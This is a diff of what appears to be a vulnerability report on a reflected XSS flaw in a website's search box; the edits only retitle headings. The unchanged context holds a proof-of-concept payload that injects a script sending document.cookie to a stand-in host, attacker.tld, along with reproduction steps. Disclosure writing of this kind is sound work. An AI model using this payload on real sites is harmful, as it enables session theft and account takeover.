@@ -4,7 +4,7 @@ Unauthenticated Reflected XSS in Search Functionality Allows Arbitrary JavaScrip
 ## OWASP - Vulnerability
 OWASP Top 10 2025 - A05 Injection
 
-## Summary
+## Description / Summary
 An unauthenticated Reflected Cross-Site Scripting (`XSS`) vulnerability exists in the website's search functionality, allowing attackers to execute arbitrary JavaScript in a victim's browser. When a user visits a specially crafted URL containing malicious script in the search query, the server immediately reflects that input back into the HTTP response without proper sanitization or context-aware output encoding
 
 ## Vulnerable Endpoint
@@ -17,7 +17,7 @@ An unauthenticated Reflected Cross-Site Scripting (`XSS`) vulnerability exists i
   cybrnoob'"<><script>fetch('https://attacker.tld/steal?c='+document.cookie)</script>
 ```
 
-## Steps to Reproduce
+## POC / Steps to Reproduce
 1. Interact with the search box at `https://tutorialrepublic.pwnedbox.site/` and observe whether the input `cybrnoob'">` is reflected in the source.
    <img width="1512" height="982" alt="SCR-20261119-jyqv" src="https://github.com/user-attachments/assets/9a9e3c61-fc9a-4b15-b429-9b6a9dc27220" />
 2. Inject javascript in the search box to verify if it is executed.
